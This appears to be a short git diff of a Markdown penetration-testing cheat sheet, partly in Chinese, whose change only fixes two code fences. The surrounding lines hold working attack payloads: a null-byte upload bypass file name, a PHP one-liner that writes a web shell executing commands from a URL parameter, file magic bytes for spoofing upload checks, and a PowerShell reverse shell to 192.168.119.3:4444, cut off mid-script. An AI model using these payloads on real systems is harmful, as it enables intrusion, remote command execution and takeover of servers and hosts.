@@ -14,7 +14,7 @@ filename.php%00.pdf
 <?php fputs(fopen('shell.php','w'),'<?php eval($_GET[cmd])?>');?>
 ```
 ### 文件类型特征码（Convert to ascii in burp）
-···
+```
 JPEG (jpg)，文件头：FFD8FF
 PNG (png)，文件头：89504E47
 GIF (gif)，文件头：47494638
@@ -46,7 +46,7 @@ MPEG (mpg)，文件头：000001B3
 Quicktime (mov)，文件头：6D6F6F76
 Windows Media (asf)，文件头：3026B2758E66CF11
 MIDI (mid)，文件头：4D546864
-···
+```
 ### Powershell reverse shell
 ```
 $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
